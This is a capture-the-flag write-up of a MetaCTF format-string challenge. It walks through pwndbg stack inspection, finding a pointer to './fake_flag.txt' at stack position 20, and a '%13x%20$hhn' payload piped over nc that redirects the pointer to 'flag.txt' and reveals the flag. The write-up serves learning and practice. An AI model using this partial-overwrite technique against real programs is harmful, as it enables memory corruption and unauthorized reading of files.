

This is my first challenge trying out WSL2, surprisingly easy to use!

[[format-strings]]
[[ghidra]]
[[gdb-pwndbg]]
### Reflection

This challenge took me some time to get right which was disappointing as in theory it is quite simple. The file has all protections enabled, stripped of all symbols. I spent quite a long time in Ghidra with this one, renaming all the functions before realising that it was not necessary. If I had gone through GDB first, I probably would have seen the string `./fake_flag.txt` first and  known known what to look for. Lessons for next time though.

I thought about leaking the address of the fake flag string first, though realised in doing so there was no way to then overwrite the return value to rerun the function to exploit it. I then tried to write my own string `flag.txt` to an address and then overwrite the pointer at position 20 and it was only then when I realised I could just adjust the lowest bytes directly saving a lot of work!


```
beast@laptop:~/rstcon$ nc icc.metaproblems.com 5300
Flag file found safe and sound.
Please enter your input:
a
a
MetaCTF{Yeah, this isn't the flag... It's probably named something other than fake_flag.txt}
```


The challenge intro gives an idea its a format string vuln. We can see a pointer on the stack that shows ./fake_flag.txt. (stack from first printf call. When running in GDB, `break printf` and then look at the stack)


```
pwndbg> stack 50
00:0000│ rsp 0x7fffffffdf18 —▸ 0x55555555544c ◂— mov rsp, rbx
01:0008│ rdi 0x7fffffffdf20 ◂— 0xa61616161 /* 'aaaa\n' */
02:0010│-048 0x7fffffffdf28 —▸ 0x7ffff7fa7780 (_IO_2_1_stdout_) ◂— 0xfbad2887
03:0018│-040 0x7fffffffdf30 —▸ 0x5555555560a8 ◂— 'Flag file found safe and sound.'
04:0020│-038 0x7fffffffdf38 —▸ 0x7ffff7e0cfaa (puts+346) ◂— cmp eax, -1
05:0028│ rbx 0x7fffffffdf40 ◂— 0x20ffffdf70
06:0030│-028 0x7fffffffdf48 ◂— 0x1f
07:0038│-020 0x7fffffffdf50 —▸ 0x7fffffffdf20 ◂— 0xa61616161 /* 'aaaa\n' */
08:0040│-018 0x7fffffffdf58 ◂— 0xf470a78a15674a00
09:0048│-010 0x7fffffffdf60 —▸ 0x7fffffffe0b8 —▸ 0x7fffffffe323 ◂— '/home/beast/rstcon/reader'
0a:0050│-008 0x7fffffffdf68 ◂— 0
0b:0058│ rbp 0x7fffffffdf70 —▸ 0x7fffffffdfa0 ◂— 1
0c:0060│+008 0x7fffffffdf78 —▸ 0x555555555529 ◂— mov eax, 0
0d:0068│+010 0x7fffffffdf80 —▸ 0x7fffffffe0b8 —▸ 0x7fffffffe323 ◂— '/home/beast/rstcon/reader'
0e:0070│+018 0x7fffffffdf88 ◂— 0x100000064 /* 'd' */
0f:0078│+020 0x7fffffffdf90 —▸ 0x555555558010 —▸ 0x555555556008 ◂— './fake_flag.txt'
```

`%20$p -> 0x555555558010

This we can see is in position 20 (determined from the usual fuzzing script)

```
pwndbg> x/gx 0x555555558010
0x555555558010: 0x0000555555556008
pwndbg> x/gx 0x0000555555556008
0x555555556008: 0x665f656b61662f2e
```

As position 20 points to the string and we can write to the stack, we can overwrite the lowest byte to ignore the `./fake_` to set the pointer to `flag.txt`



**Solution:** I had an odd problem that occurred when i tried to print the whole thing in one go in which the `$hhn` would not print. I'm assuming it thinks $hhn is a variable so splitting it up worked.


```
beast@laptop:~$ python3 -c "print(b'%13x%20' + b'$' + b'hhn')" > payload`
beast@laptop:~$ nc icc.metaproblems.com 5300 < payload

Flag file found safe and sound.
Please enter your input:
b'     9f6348d0'
MetaCTF{57r1ng_f0rm4tt1n9_f0r_t3h_w1n}

```

we can break the command down:

`13x` - pad the input with 13 bytes
`%20` - refers to position 20 on the stack
`$hhn` write the number of bytes written before this to the position referred above (position 20 on the stack)